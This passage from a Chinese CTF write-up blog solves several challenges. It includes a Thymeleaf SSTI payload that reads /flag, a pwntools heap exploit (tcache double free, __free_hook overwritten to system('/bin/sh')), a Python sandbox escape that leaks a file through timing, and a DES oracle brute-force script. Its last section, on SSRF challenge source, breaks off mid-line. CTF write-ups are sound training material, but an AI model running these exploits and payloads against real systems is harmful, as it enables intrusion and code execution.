see.</p><p>进入靶机，f12，发现：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">var app = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">    <span class="keyword">e</span><span class="variable">l:</span> <span class="string">'#app'</span>,</span><br><span class="line">    dat<span class="variable">a:</span> &#123;</span><br><span class="line">        conten<span class="variable">t:</span> <span class="string">''</span>,</span><br><span class="line">        resul<span class="variable">t:</span> <span class="string">''</span></span><br><span class="line">    &#125;,</span><br><span class="line">    method<span class="variable">s:</span> &#123;</span><br><span class="line">        reques<span class="variable">t:</span> <span class="function"><span class="keyword">function</span><span class="params">(event)</span> &#123;</span></span><br><span class="line">            var <span class="keyword">vm</span> = this</span><br><span class="line">            axios.post(<span class="string">'/render'</span>, &#123;</span><br><span class="line">                conten<span class="variable">t:</span> <span class="keyword">vm</span>.content</span><br><span class="line">            &#125;)</span><br><span class="line">                .then(<span class="function"><span class="keyword">function</span> <span class="params">(response)</span> &#123;</span></span><br><span class="line">                    console.<span class="built_in">log</span>(response)</span><br><span class="line">                    <span class="keyword">vm</span>.result = response.data.result</span><br><span class="line">                &#125;)</span><br><span class="line">                .<span class="keyword">catch</span>(<span class="function"><span class="keyword">function</span> <span class="params">(error)</span> &#123;</span></span><br><span class="line">                    console.<span class="built_in">log</span>(error)</span><br><span class="line">                    <span class="keyword">vm</span>.result = error</span><br><span class="line">                &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>再根据题目Render，应该是个SSTI无疑</p><p>学习<a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">文章</a></p><p>但是表示自己太菜了，甚至没看出来这个网页的框架</p><p>于是先去做了别的题。</p><p>之后队友说，是springboot，他说进入<a href="http://47.107.244.251:18080/render回显的是" target="_blank" rel="noopener">http://47.107.244.251:18080/render回显的是</a></p><p><img src="https://i.loli.net/2020/04/30/hgyOsAmMtkcIlWo.png" alt="Render">遂抓包，得到</p><p><img src="https://i.loli.net/2020/04/30/nLXKC8eZxu9afbw.png" alt="Render"></p><p>因为Spring Boot 官方推荐使用 “Thymeleaf”模板引擎</p><p>于是试试是否有Thymeleaf 渲染</p><p><img src="https://i.loli.net/2020/04/30/xb6QnRTlcOXhFqG.png" alt="Render"></p><p>发现失败，把思路丢给队友，让他再去试试。</p><p>最后很尴尬，队友说，我符号用错了，该用大括号，（啊，低级错误，233333）</p><p><img src="https://i.loli.net/2020/04/30/Ug9QuyRI2vSjYfr.png" alt="Render"></p><p>回显成功，于是java读文件一把梭</p><p>payload</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"content"</span>:<span class="type"></span>"[[$&#123;<span class="keyword">new</span> <span class="type">java</span>.io.BufferedReader(<span class="keyword">new</span> <span class="type">java</span>.io.FileReader(\<span class="string">"/flag\")).readLine()&#125;]]"</span>&#125;</span><br></pre></td></tr></table></figure><p>发包得到flag</p><p><img src="https://i.loli.net/2020/04/30/WRrA9LvksInEeTf.png" alt="image-20200430233603887"></p><p>flag{nBz9mertYP@pyyZxx9@nn}</p><h3 id="2019"><a href="#2019" class="headerlink" title="2019"></a>2019</h3><p>题目描述：Hidden in the history</p><p>下载得到图片</p><p>放进Stegsolve.jar，调整通道发现端倪</p><p><img src="https://i.loli.net/2020/04/30/tNLGsorfkJ6TU45.png" alt="2019"></p><p>LSB隐写，</p><p>然后放进zsteg，导出得到字符串</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="attribute">QW8obWdIW11XTyxyOFVTM0dNMlIySSVZQjdzdA</span>==</span><br></pre></td></tr></table></figure><p>去掉括号base64得到:</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">Ao</span>(mgH[]<span class="symbol">WO</span>,r8US3GM2R2I<span class="comment">%YB7st</span></span><br></pre></td></tr></table></figure><p>然后看不出特征，于是先base全家桶试了一波，发现是base85</p><p>解得：flag{~h!%3W-9jKB6(fG}</p><h3 id="Hub"><a href="#Hub" class="headerlink" title="Hub"></a>Hub</h3><p>题目描述：tip:题目环境为Ubuntu18.04，flag路径/home/flag</p><p>这个题可以利用堆上的相对偏移然后通过delete来double free，且2.27版本libc因为有tacahe机制，所以doublefree的利用变得非常简单，先填满7个chunk，再free一个到unsortedbin里面去，利用里面main_arean的地址改写后面2个字节，爆破一下可以得到free_hook中的chunk，通过改写free_hook为puts的plt表，然后通过delete函数找到对应可以泄露libc的地址的偏移，然后就可以打印出libc的地址，再改写free_hook为system函数地址，再通过libc上/bin/sh字符串的偏移，成功执行system(“/bin/sh”)，getshell。脚本如下</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#-*- coding:UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">from</span> pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'split'</span>, <span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process('./hub')</span></span><br><span class="line">p = remote(<span class="string">'47.112.139.218'</span>, <span class="number">13132</span>)</span><br><span class="line">elf = ELF(<span class="string">'./hub'</span>)</span><br><span class="line"></span><br><span class="line">def choose(choice):</span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(str(choice) + <span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line">def <span class="built_in">add</span>(size):</span><br><span class="line">    choose(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'How long will you stay?\n'</span>)</span><br><span class="line">    p.sendline(str(size) + <span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line">def <span class="built_in">delete</span>(index):</span><br><span class="line">    choose(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Which hub don\'t you want?\n'</span>)</span><br><span class="line">    p.sendline(str(index) + <span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line">def edit(content):</span><br><span class="line">    choose(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'What do you want?\n'</span>)</span><br><span class="line">    p.<span class="built_in">send</span>(content)</span><br><span class="line"></span><br><span class="line"><span class="built_in">add</span>(<span class="number">0xf0</span>)</span><br><span class="line"><span class="built_in">add</span>(<span class="number">0xf0</span>)</span><br><span class="line"><span class="built_in">add</span>(<span class="number">0xf0</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">delete</span>(<span class="number">-0x200</span>)</span><br><span class="line"><span class="built_in">delete</span>(<span class="number">-0x200</span>)</span><br><span class="line"><span class="built_in">delete</span>(<span class="number">-0x200</span>)</span><br><span class="line"><span class="built_in">delete</span>(<span class="number">-0x200</span>)</span><br><span class="line"><span class="built_in">delete</span>(<span class="number">-0x200</span>)</span><br><span class="line"><span class="built_in">delete</span>(<span class="number">-0x200</span>)</span><br><span class="line"><span class="built_in">delete</span>(<span class="number">-0x200</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">delete</span>(<span class="number">-0x200</span>)</span><br><span class="line"><span class="built_in">add</span>(<span class="number">0xe0</span>)</span><br><span class="line">edit(<span class="string">'\xe8\x68'</span>)</span><br><span class="line"><span class="built_in">add</span>(<span class="number">0xf0</span>)</span><br><span class="line"><span class="built_in">add</span>(<span class="number">0xf0</span>)</span><br><span class="line">edit(p64(elf.plt[<span class="string">'puts'</span>]))</span><br><span class="line"><span class="built_in">delete</span>(<span class="number">-0x1ee0</span>)</span><br><span class="line">libcbase = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x3eba83</span></span><br><span class="line"><span class="built_in">log</span>.info(<span class="string">"libcbase:%#x"</span> %libcbase)</span><br><span class="line">system_addr = libcbase + <span class="number">0x4f440</span></span><br><span class="line">edit(p64(system_addr))</span><br><span class="line"><span class="built_in">delete</span>(<span class="number">-0x239a4e</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/04/30/ZfXlDQmhzRCW4vF.png" alt="Hub"></p><h3 id="8v"><a href="#8v" class="headerlink" title="8v"></a>8v</h3><p>题目描述：I run the js code and get flag</p><p>得到一份文档，全是字节码，遂开始一行一行“翻译”</p><p>参考文章</p><p><a href="https://github.com/v8/v8/blob/master/src/interpreter/interpreter-generator.cc" target="_blank" rel="noopener">https://github.com/v8/v8/blob/master/src/interpreter/interpreter-generator.cc</a></p><p><a href="https://github.com/v8/v8/blob/master/src/interpreter/bytecodes.h" target="_blank" rel="noopener">https://github.com/v8/v8/blob/master/src/interpreter/bytecodes.h</a></p><p><a href="https://zhuanlan.zhihu.com/p/28590489" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/28590489</a></p><p><a href="https://github.com/danbev/learning-v8" target="_blank" rel="noopener">https://github.com/danbev/learning-v8</a></p><p>看懂完指令并不是很难，核心就是一个简单的三项数异或加密，</p><p>然后存在两个类似于斐波那契数列的前后相关的数列，</p><p>数列a起始位是$a_1=88$</p><p>函数是：$a_n=(a_{n-1}*65+66)$%$256$</p><p>得到数列：$a = [88, 154, 92, 158, 96, 162, 100, 166, 104, 170, 108, 174, 112, 178, 116, 182, 120, 186, 124, 190, 128, 194, 132, 198, 136, 202, 140, 206, 144, 210,]$</p><p>数列b起始位是$b_1=148$</p><p>函数是：$b_n=(b_{n-1}*35-16)$%$256$</p><p>最后程序还有个将数列b逆序的操作</p><p>得到数列：$b=[236, 212, 204, 116, 172, 20, 140, 180, 108, 84, 76, 244, 44, 148, 12, 52, 236, 212, 204, 116, 172, 20, 140, 180, 108, 84, 76, 244, 44, 148]$</p><p>再加上</p><p>enc=b’\xd2”\xf1\x8d\xb7\xe0\xd0MF\x87T?\x1fI\x1c\xe7\xcb\x07\xc3\x95z\xb3z\x0b\xbb\xdb\xa1I\xc5;’</p><p>最后三个数列逐位异或，得到</p><p>flag{V8_ByteCode_is_Very_Easy}</p><h3 id="PyBox"><a href="#PyBox" class="headerlink" title="PyBox"></a>PyBox</h3><p>题目描述：cut flag sleep repeat</p><p>连上沙箱</p><p><img src="https://i.loli.net/2020/04/30/vdUtPfwu4DlzCy3.png" alt="PyBox"></p><p>看着像python，但是这个python为啥没有一点点功能？啥也不能干？也没有回显。</p><p>不过没有回显倒可以利用sql的时间盲注的方法，但是有啥功能能利用呢？</p><p>于是去学习沙箱逃逸一波</p><p><a href="https://bestwing.me/awesome-python-sandbox-in-ciscn.html" target="_blank" rel="noopener">https://bestwing.me/awesome-python-sandbox-in-ciscn.html</a></p><p><img src="https://i.loli.net/2020/04/30/MuHaAbo7zpVqLXe.png" alt="PyBox"></p><p>发现了这个，</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">__import__</span><span class="selector-class">.__getattribute__</span>(<span class="string">'__clo'</span>+<span class="string">'sure__'</span>)<span class="selector-attr">[0]</span><span class="selector-class">.cell_contents</span>(<span class="string">'o'</span>+<span class="string">'s'</span>)<span class="selector-class">.__getattribute__</span>(<span class="string">'sy'</span>+<span class="string">'stem'</span>)(<span class="string">'l'</span>+<span class="string">'s home'</span>)</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/04/30/MUOSVZzu9Qqt4fX.png" alt="PyBoxV"></p><p>没有报错，</p><p>但是这里没有回显呃，于是，时间盲注结合closure，</p><p>再根据这篇文章<a href="https://blog.csdn.net/caoshunxin01/article/details/79355566" target="_blank" rel="noopener">https://blog.csdn.net/caoshunxin01/article/details/79355566</a></p><p>利用cut - c 逐位爆破</p><p>payload:</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">__import__</span><span class="selector-class">.__getattribute__</span>(<span class="string">'__clo'</span>+<span class="string">'sure__'</span>)<span class="selector-attr">[0]</span><span class="selector-class">.cell_contents</span>(<span class="string">'o'</span>+<span class="string">'s'</span>)<span class="selector-class">.__getattribute__</span>(<span class="string">'sy'</span>+<span class="string">'stem'</span>)(<span class="string">'flag_p=`cut -c 1 /home/flag`; [ $flag_p = \"f\" ] &amp;&amp; sleep 2'</span></span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> <span class="built_in">time</span></span><br><span class="line"></span><br><span class="line">sh=remote(<span class="string">"47.112.108.17"</span>,<span class="number">12312</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"&gt;&gt;&gt;"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ans = <span class="string">"__import__.__getattribute__('__clo'+'sure__')[0].cell_contents('o'+'s').__getattribute__('sy'+'stem')('a=`cut -c 1 /home/flag`; [ $a = \"</span>f\<span class="string">" ] &amp;&amp; sleep 1'"</span></span><br><span class="line">t = <span class="built_in">time</span>.<span class="built_in">time</span>()</span><br><span class="line">sh.sendline(ans)</span><br><span class="line">sh.recvuntil(<span class="string">"&gt;&gt;&gt;"</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">time</span>.<span class="built_in">time</span>()-t &gt; <span class="number">0.5</span> :</span><br><span class="line">print(<span class="string">"get!"</span>)</span><br><span class="line">break</span><br></pre></td></tr></table></figure><p>得到回显</p><p><img src="https://i.loli.net/2020/04/30/UkcE5Dw72Roafty.png" alt="PyBox"></p><p>利用成功。再加两个循环，就好了。</p><p>得到结果</p><p><img src="https://i.loli.net/2020/04/30/AHvZk86rQUMOYh3.png" alt="PyBox"></p><p>不知道是不是后来改flag了，之前跑脚本得到的是</p><p>flag{Pyt5on_S4ndB0x+4pParmOr_S4ndb0x}</p><p>写wp复现的时候得到的是</p><p>flag{Pyt5on_S4ndB0x+4pParmOr_S4ndb0x_sorry}  </p><p>hhhh?</p><h3 id="Babycry"><a href="#Babycry" class="headerlink" title="Babycry"></a>Babycry</h3><p>nc 过去得到加密规则</p><p><img src="https://i.loli.net/2020/04/30/VQmAefY47rS928R.png" alt="Babycry"></p><p>写wp的时候环境关了，这里就直接口述了。</p><p>既然加密规则是des（key,sth..flag{*}padding）</p><p>加上hint</p><p>所以我们控制输入，可以使得被加密的字符末尾为</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#125;_______（<span class="number">7</span>个<span class="keyword">_</span>）</span><br></pre></td></tr></table></figure><p>首先我们先输入</p><p>des a</p><p>des aa</p><p>des aaa</p><p>直到拼接后的字符串长度为8的倍数，</p><p>印象里应该是两个a的时候，就好了。</p><p>然后我们当输入三个a的时候，字符串应该就是aaaflag{*}再加上七个_，那么末尾就应该是一个}加七个_组成的，</p><p>密文末尾的8个字节，就是这一个}加七个_字符所组成的八个字符的密文</p><p>我们可以输入</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#125;_______（<span class="number">7</span>个<span class="keyword">_</span>）</span><br></pre></td></tr></table></figure><p>看返回的密文的前8个字节加一验证。</p><p>于是思路就是，控制padding，逐位爆破，</p><p>输入aaaa，返回密文的后8字节就是明文    </p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?&#125;______（<span class="number">6</span>个<span class="literal">_</span>）<span class="meta">#?代表flag最后一位字符</span></span><br></pre></td></tr></table></figure><p>的密文</p><p>然后我们在爆破这一位，直到返回密文的前八个字节与输入aaaa返回的密文的最后8字节相同位置，</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level =<span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">sh</span>=remote(<span class="string">"139.9.222.76"</span>,19999)</span><br><span class="line"><span class="keyword">sh</span>.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">range</span>(33,126):</span><br><span class="line">    ans = <span class="string">"des "</span>+chr(i)+<span class="string">"&#125;______"</span></span><br><span class="line">    <span class="keyword">sh</span>.sendline(ans)</span><br><span class="line">    p = <span class="keyword">sh</span>.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"54f6d4254fe2a8d4"</span> <span class="keyword">in</span> p :</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">"get!"</span>)</span><br><span class="line">        <span class="keyword">print</span>(ans)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>得到结果</p><p><img src="https://i.loli.net/2020/04/30/UYbicRHzJ5n2gEu.png" alt="Babycry"></p><p>然后以此类推，逐位爆破。</p><p>后面还有点区别就是，爆破完8位，用来验证的密文不能再从末尾找了，得找之前找的8个字节密文的前8个字节密文。</p><p>比赛的时候就是用这个半自动化脚本手撸的，</p><p>原本想在写wp的时候写个全自动化的，奈何环境关了，没法测试。遂放弃。</p>]]></content>
      
      
      <categories>
          
          <category> 比赛小屋 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Write Up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019 De1CTF</title>
      <link href="/2019/08/03/2019De1CTF/"/>
      <url>/2019/08/03/2019De1CTF/</url>
      
        <content type="html"><![CDATA[<h3 id="SSRF-ME"><a href="#SSRF-ME" class="headerlink" title="SSRF ME"></a>SSRF ME</h3><p>hint：flag is in ./flag.txt</p><p>访问靶机，拿到题目源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">'latin1'</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, action, param, sign, ip)</span>:</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):          <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span><span class="params">(self)</span>:</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"scan"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'w'</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">"Connection Timeout"</span>):</span><br><span class="line">                    result[<span class="string">'data'</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"read"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'r'</span>)</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">'data'</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">'code'</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">'data'</span>] = <span class="string">"Action Error"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">'msg'</span>] = <span class="string">"Sign Error"</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route("/geneSign", methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span><span class="params">()</span>:</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    action = <span class="string">"scan"</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/De1ta',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span><span class="params">()</span>:</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">"action"</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">"sign"</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"No Hacker!!!!"</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">"code.txt"</span>,<span class="string">"r"</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(param)</span>:</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Connection Timeout"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span><span class="params">(action, param)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(content)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span><span class="params">(param)</span>:</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">"gopher"</span>) <span class="keyword">or</span> check.startswith(<span 